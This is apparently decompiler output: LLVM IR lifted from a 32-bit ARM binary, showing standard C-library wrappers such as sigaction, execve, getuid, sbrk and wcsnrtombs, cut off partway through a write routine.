define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17428 = load i32, i32* @r4, align 4
  store i32 %v3_17428, i32* %stack_var_-8, align 4
  %v1_1742c = load i32, i32* @r1, align 4
  %v2_1742c = inttoptr i32 %v1_1742c to %sigaction*
  %v3_1742c = load i32, i32* @r2, align 4
  %v4_1742c = inttoptr i32 %v3_1742c to %sigaction*
  %v5_1742c = call i32 @sigaction(i32 %arg1, %sigaction* %v2_1742c, %sigaction* %v4_1742c)
  store i32 %v5_1742c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1742c, -4095
  br i1 %tmp, label %dec_label_pc_1744c, label %dec_label_pc_1743c

dec_label_pc_1743c:                               ; preds = %entry
  %v0_1743c = call i32 @__errno_location()
  %v0_17440 = load i32, i32* %r4.global-to-local, align 4
  %v1_17440 = sub i32 0, %v0_17440
  %v2_17444 = inttoptr i32 %v0_1743c to i32*
  store i32 %v1_17440, i32* %v2_17444, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1744c

dec_label_pc_1744c:                               ; preds = %entry, %dec_label_pc_1743c
  %v0_1744c = phi i32 [ %v5_1742c, %entry ], [ -1, %dec_label_pc_1743c ]
  %v2_17450 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17450, i32* %r4.global-to-local, align 4
  ret i32 %v0_1744c

; uselistorder directives
  uselistorder i32 %v5_1742c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1744c, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17454 = load i32, i32* @r4, align 4
  store i32 %v3_17454, i32* %stack_var_-8, align 4
  %v0_17458 = load i32, i32* @r0, align 4
  %v1_17458 = inttoptr i32 %v0_17458 to i8*
  %v2_17458 = load i32, i32* @r1, align 4
  %v3_17458 = inttoptr i32 %v2_17458 to i8*
  %v4_17458 = insertvalue [1 x i8*] undef, i8* %v3_17458, 0
  %v5_17458 = load i32, i32* @r2, align 4
  %v6_17458 = inttoptr i32 %v5_17458 to i8*
  %v7_17458 = insertvalue [1 x i8*] undef, i8* %v6_17458, 0
  %v8_17458 = call i32 @execve(i8* %v1_17458, [1 x i8*] %v4_17458, [1 x i8*] %v7_17458)
  store i32 %v8_17458, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_17458, -4095
  br i1 %tmp, label %dec_label_pc_17478, label %dec_label_pc_17468

dec_label_pc_17468:                               ; preds = %entry
  %v0_17468 = call i32 @__errno_location()
  %v0_1746c = load i32, i32* %r4.global-to-local, align 4
  %v1_1746c = sub i32 0, %v0_1746c
  %v2_17470 = inttoptr i32 %v0_17468 to i32*
  store i32 %v1_1746c, i32* %v2_17470, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17478

dec_label_pc_17478:                               ; preds = %entry, %dec_label_pc_17468
  %v0_17478 = phi i32 [ %v8_17458, %entry ], [ -1, %dec_label_pc_17468 ]
  %v2_1747c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1747c, i32* @r4, align 4
  ret i32 %v0_17478

; uselistorder directives
  uselistorder i32 %v8_17458, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17478, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17480 = load i32, i32* @r4, align 4
  store i32 %v3_17480, i32* %stack_var_-8, align 4
  %v0_17488 = load i32, i32* @r0, align 4
  store i32 %v0_17488, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17488, -4095
  br i1 %tmp, label %dec_label_pc_174a4, label %dec_label_pc_17494

dec_label_pc_17494:                               ; preds = %entry
  %v0_17494 = call i32 @__errno_location()
  %v0_17498 = load i32, i32* %r4.global-to-local, align 4
  %v1_17498 = sub i32 0, %v0_17498
  %v2_1749c = inttoptr i32 %v0_17494 to i32*
  store i32 %v1_17498, i32* %v2_1749c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_174a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_174a4

dec_label_pc_174a4:                               ; preds = %entry, %dec_label_pc_17494
  %v2_174a8 = phi i32 [ %v3_17480, %entry ], [ %v2_174a8.pre, %dec_label_pc_17494 ]
  %v0_174a4 = phi i32 [ %v0_17488, %entry ], [ -1, %dec_label_pc_17494 ]
  store i32 %v2_174a8, i32* @r4, align 4
  ret i32 %v0_174a4

; uselistorder directives
  uselistorder i32 %v0_17488, { 1, 0, 2 }
  uselistorder label %dec_label_pc_174a4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_174ac = load i32, i32* @r4, align 4
  store i32 %v3_174ac, i32* %stack_var_-8, align 4
  %v0_174b4 = load i32, i32* @r0, align 4
  store i32 %v0_174b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_174b4, -4095
  br i1 %tmp, label %dec_label_pc_174d0, label %dec_label_pc_174c0

dec_label_pc_174c0:                               ; preds = %entry
  %v0_174c0 = call i32 @__errno_location()
  %v0_174c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_174c4 = sub i32 0, %v0_174c4
  %v2_174c8 = inttoptr i32 %v0_174c0 to i32*
  store i32 %v1_174c4, i32* %v2_174c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_174d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_174d0

dec_label_pc_174d0:                               ; preds = %entry, %dec_label_pc_174c0
  %v2_174d4 = phi i32 [ %v3_174ac, %entry ], [ %v2_174d4.pre, %dec_label_pc_174c0 ]
  %v0_174d0 = phi i32 [ %v0_174b4, %entry ], [ -1, %dec_label_pc_174c0 ]
  store i32 %v2_174d4, i32* @r4, align 4
  ret i32 %v0_174d0

; uselistorder directives
  uselistorder i32 %v0_174b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_174d0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_174d8 = load i32, i32* @r4, align 4
  store i32 %v3_174d8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_174fc, label %dec_label_pc_174ec

dec_label_pc_174ec:                               ; preds = %entry
  %v0_174ec = call i32 @__errno_location()
  %v0_174f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_174f0 = sub i32 0, %v0_174f0
  %v2_174f4 = inttoptr i32 %v0_174ec to i32*
  store i32 %v1_174f0, i32* %v2_174f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17500.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_174fc

dec_label_pc_174fc:                               ; preds = %entry, %dec_label_pc_174ec
  %v2_17500 = phi i32 [ %v3_174d8, %entry ], [ %v2_17500.pre, %dec_label_pc_174ec ]
  %v0_174fc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_174ec ]
  store i32 %v2_17500, i32* %r4.global-to-local, align 4
  ret i32 %v0_174fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_174fc, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17504 = load i32, i32* @r4, align 4
  store i32 %v3_17504, i32* %stack_var_-8, align 4
  %v0_1750c = load i32, i32* @r0, align 4
  store i32 %v0_1750c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1750c, -4095
  br i1 %tmp, label %dec_label_pc_17528, label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %entry
  %v0_17518 = call i32 @__errno_location()
  %v0_1751c = load i32, i32* %r4.global-to-local, align 4
  %v1_1751c = sub i32 0, %v0_1751c
  %v2_17520 = inttoptr i32 %v0_17518 to i32*
  store i32 %v1_1751c, i32* %v2_17520, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1752c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17528

dec_label_pc_17528:                               ; preds = %entry, %dec_label_pc_17518
  %v2_1752c = phi i32 [ %v3_17504, %entry ], [ %v2_1752c.pre, %dec_label_pc_17518 ]
  %v0_17528 = phi i32 [ %v0_1750c, %entry ], [ -1, %dec_label_pc_17518 ]
  store i32 %v2_1752c, i32* %r4.global-to-local, align 4
  ret i32 %v0_17528

; uselistorder directives
  uselistorder i32 %v0_1750c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17528, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_17530 = load i32, i32* @r4, align 4
  store i32 %v3_17530, i32* %stack_var_-8, align 4
  %v6_17534 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_17534, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_17534, -4095
  br i1 %tmp6, label %dec_label_pc_17554, label %dec_label_pc_17544

dec_label_pc_17544:                               ; preds = %entry
  %v0_17544 = call i32 @__errno_location()
  %v0_17548 = load i32, i32* %r4.global-to-local, align 4
  %v1_17548 = sub i32 0, %v0_17548
  %v2_1754c = inttoptr i32 %v0_17544 to i32*
  store i32 %v1_17548, i32* %v2_1754c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17554

dec_label_pc_17554:                               ; preds = %entry, %dec_label_pc_17544
  %v0_17554 = phi i32 [ %v6_17534, %entry ], [ -1, %dec_label_pc_17544 ]
  %v2_17558 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17558, i32* %r4.global-to-local, align 4
  ret i32 %v0_17554

; uselistorder directives
  uselistorder i32 %v6_17534, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17554, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1755c = load i32, i32* @r4, align 4
  store i32 %v3_1755c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2cadc.1108 to i32), i32* %r4.global-to-local, align 4
  %v2_17564 = load i32, i32* @global_var_2cadc.1108, align 4
  %v2_17568 = icmp eq i32 %v2_17564, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_17568, label %dec_label_pc_17578, label %dec_label_pc_17584

dec_label_pc_17578:                               ; preds = %entry
  %v2_17578 = call i32 @__GI_brk(i32* null)
  %v1_1757c = icmp slt i32 %v2_17578, 0
  br i1 %v1_1757c, label %dec_label_pc_175a4, label %dec_label_pc_17584thread-pre-split

dec_label_pc_17584thread-pre-split:               ; preds = %dec_label_pc_17578
  %v0_17588.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_17584.pre = load i32, i32* @global_var_2cadc.1108, align 4
  br label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %dec_label_pc_17584thread-pre-split, %entry
  %v2_17584 = phi i32 [ %v2_17584.pre, %dec_label_pc_17584thread-pre-split ], [ %v2_17564, %entry ]
  %v1_17590 = phi i32 [ %v0_17588.pr, %dec_label_pc_17584thread-pre-split ], [ %arg1, %entry ]
  %v2_17588 = icmp eq i32 %v1_17590, 0
  store i32 %v2_17584, i32* %r4.global-to-local, align 4
  br i1 %v2_17588, label %dec_label_pc_175a8, label %dec_label_pc_17598

dec_label_pc_17598:                               ; preds = %dec_label_pc_17584
  %v2_17590 = add i32 %v1_17590, %v2_17584
  %v1_17598 = inttoptr i32 %v2_17590 to i32*
  %v2_17598 = call i32 @__GI_brk(i32* %v1_17598)
  %v1_1759c = icmp slt i32 %v2_17598, 0
  br i1 %v1_1759c, label %dec_label_pc_175a4, label %dec_label_pc_17598.dec_label_pc_175a8_crit_edge

dec_label_pc_17598.dec_label_pc_175a8_crit_edge:  ; preds = %dec_label_pc_17598
  %v0_175a8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_175a8

dec_label_pc_175a4:                               ; preds = %dec_label_pc_17598, %dec_label_pc_17578
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_175a8

dec_label_pc_175a8:                               ; preds = %dec_label_pc_17598.dec_label_pc_175a8_crit_edge, %dec_label_pc_17584, %dec_label_pc_175a4
  %v0_175a8 = phi i32 [ %v0_175a8.pre, %dec_label_pc_17598.dec_label_pc_175a8_crit_edge ], [ %v2_17584, %dec_label_pc_17584 ], [ -1, %dec_label_pc_175a4 ]
  %v2_175ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_175ac, i32* @r4, align 4
  ret i32 %v0_175a8

; uselistorder directives
  uselistorder i32 %v2_17584, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 19, 20, 26, 27, 24, 25, 23, 22, 21, 28, 29, 30, 2 }
  uselistorder label %dec_label_pc_175a8, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_175b4 = load i32, i32* @r4, align 4
  store i32 %v3_175b4, i32* %stack_var_-8, align 4
  %v0_175b8 = call i32 @wait4()
  store i32 %v0_175b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_175b8, -4095
  br i1 %tmp, label %dec_label_pc_175d8, label %dec_label_pc_175c8

dec_label_pc_175c8:                               ; preds = %entry
  %v0_175c8 = call i32 @__errno_location()
  %v0_175cc = load i32, i32* %r4.global-to-local, align 4
  %v1_175cc = sub i32 0, %v0_175cc
  %v2_175d0 = inttoptr i32 %v0_175c8 to i32*
  store i32 %v1_175cc, i32* %v2_175d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_175d8

dec_label_pc_175d8:                               ; preds = %entry, %dec_label_pc_175c8
  %v0_175d8 = phi i32 [ %v0_175b8, %entry ], [ -1, %dec_label_pc_175c8 ]
  %v2_175dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_175dc, i32* @r4, align 4
  ret i32 %v0_175d8

; uselistorder directives
  uselistorder i32 %v0_175b8, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_175d8, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2cabc.1110 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_175f0 = icmp eq i32 %arg1, 0
  br i1 %v2_175f0, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_175f8 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_17620 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_17614 = phi i32 [ %arg1, %.thread ], [ %v3_175f8, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_1760c = ptrtoint i32* %stack_var_-16 to i32
  %v2_17618 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_17618, i32* %stack_var_-16, align 4
  store i32 %v0_17620, i32* %stack_var_-12, align 4
  %v5_17628 = inttoptr i32 %v0_17614 to i8*
  %v6_17628 = call i32 @__GI_wcsnrtombs(i8* %v5_17628, i32 %v2_1760c, i32 1, i32 16, i32 %arg3)
  %v2_1762c = icmp eq i32 %v6_17628, 0
  br i1 %v2_1762c, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_17638 = phi i32 [ %v6_17628, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_17638

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_17648 = load i32, i32* @r2, align 4
  store i32 %v0_17648, i32* @r3, align 4
  %v0_17650 = load i32, i32* @r0, align 4
  %v1_17650 = load i32, i32* @r1, align 4
  %v5_17650 = inttoptr i32 %v0_17650 to i8*
  %v6_17650 = call i32 @__GI_wcsnrtombs(i8* %v5_17650, i32 %v1_17650, i32 -1, i32 %v0_17648, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_17650
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1765c = load i32, i32* @r4, align 4
  store i32 %v3_1765c, i32* %stack_var_-8, align 4
  %v10_17660 = icmp eq i32 %tmp, %arg2
  br i1 %v10_17660, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_176681 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1767c

bb:                                               ; preds = %entry
  %v4_17664 = icmp eq i8* %arg1, null
  %v0_17668 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_17664, label %dec_label_pc_1767c, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_176b8

dec_label_pc_1767c:                               ; preds = %.thread, %bb
  %v1_176bc.ph = phi i32 [ %v0_17668, %bb ], [ %v0_176681, %.thread ]
  %v2_1766c3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_1767c = icmp eq i8* %arg1, null
  store i32 %v2_1766c3.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_1767c, label %.thread4, label %dec_label_pc_176b0

.thread4:                                         ; preds = %dec_label_pc_1767c
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_176b8

dec_label_pc_17694:                               ; preds = %dec_label_pc_176d0
  %v0_17694 = call i32 @__errno_location()
  store i32 %v0_17694, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_176a0 = inttoptr i32 %v0_17694 to i32*
  store i32 84, i32* %v2_176a0, align 4
  %v0_1770c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1770c

dec_label_pc_176a8:                               ; preds = %dec_label_pc_176e0
  %v3_176e4 = zext i8 %v2_176e4 to i32
  store i32 %v3_176e4, i32* @lr, align 4
  br label %dec_label_pc_17700

dec_label_pc_176b0:                               ; preds = %dec_label_pc_1767c
  store i32 %v2_1766c3.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_176b8

dec_label_pc_176b8:                               ; preds = %bb27, %.thread4, %dec_label_pc_176b0
  %v1_176bc20 = phi i32 [ %v0_17668, %bb27 ], [ %v1_176bc.ph, %.thread4 ], [ %v1_176bc.ph, %dec_label_pc_176b0 ]
  %v2_176e014 = phi i32 [ %tmp, %bb27 ], [ %v2_1766c3.ph, %.thread4 ], [ %v2_1766c3.ph, %dec_label_pc_176b0 ]
  %v1_176b8 = load i32, i32* @r3, align 4
  %v3_176b8 = icmp uge i32 %v1_176bc20, %v1_176b8
  %v1_176b8.v1_176bc20 = select i1 %v3_176b8, i32 %v1_176b8, i32 %v1_176bc20
  store i32 %v1_176b8.v1_176bc20, i32* %r4.global-to-local, align 4
  %v1_176c4 = inttoptr i32 %arg2 to i32*
  %v2_176c4 = load i32, i32* %v1_176c4, align 4
  store i32 %v2_176c4, i32* @lr, align 4
  store i32 %v1_176b8.v1_176bc20, i32* %r0.global-to-local, align 4
  %v2_176f88 = icmp eq i32 %v1_176b8.v1_176bc20, 0
  br i1 %v2_176f88, label %dec_label_pc_17700, label %dec_label_pc_176d0

dec_label_pc_176d0:                               ; preds = %dec_label_pc_176b8, %dec_label_pc_176f0.dec_label_pc_176d0_crit_edge
  %v2_176e0 = phi i32 [ %v2_176f0, %dec_label_pc_176f0.dec_label_pc_176d0_crit_edge ], [ %v2_176e014, %dec_label_pc_176b8 ]
  %v0_176d8 = phi i32 [ %v0_176d0.pre, %dec_label_pc_176f0.dec_label_pc_176d0_crit_edge ], [ %v2_176c4, %dec_label_pc_176b8 ]
  %v1_176d0 = inttoptr i32 %v0_176d8 to i32*
  %v2_176d0 = load i32, i32* %v1_176d0, align 4
  %v1_176d8 = add i32 %v0_176d8, 4
  store i32 %v1_176d8, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_176d0, 127
  br i1 %tmp36, label %dec_label_pc_17694, label %dec_label_pc_176e0

dec_label_pc_176e0:                               ; preds = %dec_label_pc_176d0
  %v1_176e0 = trunc i32 %v2_176d0 to i8
  %v3_176e0 = inttoptr i32 %v2_176e0 to i8*
  store i8 %v1_176e0, i8* %v3_176e0, align 1
  %v0_176e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_176e4 = inttoptr i32 %v0_176e4 to i8*
  %v2_176e4 = load i8, i8* %v1_176e4, align 1
  %v2_176e8 = icmp eq i8 %v2_176e4, 0
  br i1 %v2_176e8, label %dec_label_pc_176a8, label %dec_label_pc_176f0

dec_label_pc_176f0:                               ; preds = %dec_label_pc_176e0
  %v1_176f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_176f0 = add i32 %v1_176f0, %v0_176e4
  store i32 %v2_176f0, i32* %ip.global-to-local, align 4
  %v0_176f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_176f4 = add i32 %v0_176f4, -1
  store i32 %v1_176f4, i32* %r0.global-to-local, align 4
  %v2_176f8 = icmp eq i32 %v1_176f4, 0
  br i1 %v2_176f8, label %dec_label_pc_17700, label %dec_label_pc_176f0.dec_label_pc_176d0_crit_edge

dec_label_pc_176f0.dec_label_pc_176d0_crit_edge:  ; preds = %dec_label_pc_176f0
  %v0_176d0.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_176d0

dec_label_pc_17700:                               ; preds = %dec_label_pc_176f0, %dec_label_pc_176b8, %dec_label_pc_176a8
  %v0_17700 = phi i32 [ %v0_176e4, %dec_label_pc_176a8 ], [ %v2_176e014, %dec_label_pc_176b8 ], [ %v2_176f0, %dec_label_pc_176f0 ]
  %v1_17700 = load i32, i32* @sp, align 4
  %v9_17700 = icmp eq i32 %v0_17700, %v1_17700
  br i1 %v9_17700, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_17700
  %v1_17704 = load i32, i32* @lr, align 4
  store i32 %v1_17704, i32* %v1_176c4, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_17700, %bb30
  %v0_17708 = load i32, i32* %r0.global-to-local, align 4
  %v1_17708 = load i32, i32* %r4.global-to-local, align 4
  %v2_17708 = sub i32 %v1_17708, %v0_17708
  store i32 %v2_17708, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1770c

dec_label_pc_1770c:                               ; preds = %dec_label_pc_17694, %bb31
  %v0_1770c = phi i32 [ %v0_1770c.pre, %dec_label_pc_17694 ], [ %v2_17708, %bb31 ]
  store i32 %v0_1770c, i32* %r0.global-to-local, align 4
  %v2_17714 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17714, i32* %r4.global-to-local, align 4
  ret i32 %v0_1770c

; uselistorder directives
  uselistorder i32 %v0_1770c, { 1, 0 }
  uselistorder i32 %v1_176f4, { 1, 0 }
  uselistorder i32 %v2_176f0, { 0, 2, 1 }
  uselistorder i32 %v2_176d0, { 1, 0 }
  uselistorder i32 %v2_176e014, { 1, 0 }
  uselistorder i32 %v1_176bc.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* @sp, { 7, 17, 0, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 1, 4, 3, 5, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1770c, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_176d0, { 1, 0 }
  uselistorder label %dec_label_pc_176b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1767c, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_1772c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1772c2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_1772c2, label %dec_label_pc_177cc, label %dec_label_pc_17738

dec_label_pc_1772cthread-pre-split:               ; preds = %bb22
  %v3_17750 = load i32, i32* %r7.global-to-local, align 4
  %v5_17750 = add i32 %v3_17750, %v4_17744
  store i32 %v5_17750, i32* %r7.global-to-local, align 4
  %v5_17754 = sub i32 %v0_1774c, %v4_17744
  store i32 %v5_17754, i32* %r5.global-to-local, align 4
  %v2_1772c = icmp eq i32 %v5_17754, 0
  store i1 %v2_1772c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_17754, i32* @r2, align 4
  br i1 %v2_1772c, label %dec_label_pc_1772c.dec_label_pc_177cc.loopexit_crit_edge, label %dec_label_pc_17738

dec_label_pc_17738:                               ; preds = %entry, %dec_label_pc_1772cthread-pre-split
  %v0_1773c = phi i32 [ %v5_17750, %dec_label_pc_1772cthread-pre-split ], [ %arg2, %entry ]
  %v0_17738.in = phi i32 [ %v5_17754, %dec_label_pc_1772cthread-pre-split ], [ %arg3, %entry ]
  %v0_17738 = icmp slt i32 %v0_17738.in, 0
  br i1 %v0_17738, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_17738
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17738, %bb
  %v0_17740 = load i32, i32* @r4, align 4
  %v1_17740 = add i32 %v0_17740, 4
  %v2_17740 = inttoptr i32 %v1_17740 to i32*
  %v3_17740 = load i32, i32* %v2_17740, align 4
  store i32 %v3_17740, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_1773c to i32*
  %v4_17744 = call i32 @__libc_write(i32 %v3_17740, i32* %tmp23)
  store i32 %v4_17744, i32* %r0.global-to-local, align 4
  %v1_17748 = icmp slt i32 %v4_17744, 0
  %v2_17748 = icmp eq i32 %v4_17744, 0
  store i1 %v2_17748, i1* %cpsr_z.global-to-local, align 1
  %v0_1774c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1774c, i32* %r6.global-to-local, align 4
  br i1 %v1_17748, label %dec_label_pc_1775c, label %dec_label_pc_1772cthread-pre-split

dec_label_pc_1775c:                               ; preds = %bb22
  %v0_1775c = load i32, i32* @r4, align 4
  %v1_1775c = inttoptr i32 %v0_1775c to i32*
  %v2_1775c = load i32, i32* %v1_1775c, align 4
  store i32 %v2_1775c, i32* %r3.global-to-local, align 4
  %v1_17760 = add i32 %v0_1775c, 8
  store i32 %v1_17760, i32* %r0.global-to-local, align 4
  %v1_17764 = inttoptr i32 %v1_17760 to i32*
  %v2_17764 = load i32, i32* %v1_17764, align 4
  store i32 %v2_17764, i32* %r0.global-to-local, align 4
  %v3_17764 = add i32 %v0_1775c, 12
  %v4_17764 = inttoptr i32 %v3_17764 to i32*
  %v5_17764 = load i32, i32* %v4_17764, align 4
  %v1_17768 = or i32 %v2_1775c, 8
  store i32 %v1_17768, i32* %r3.global-to-local, align 4
  %v3_1776c = sdiv i32 %v2_1775c, 256
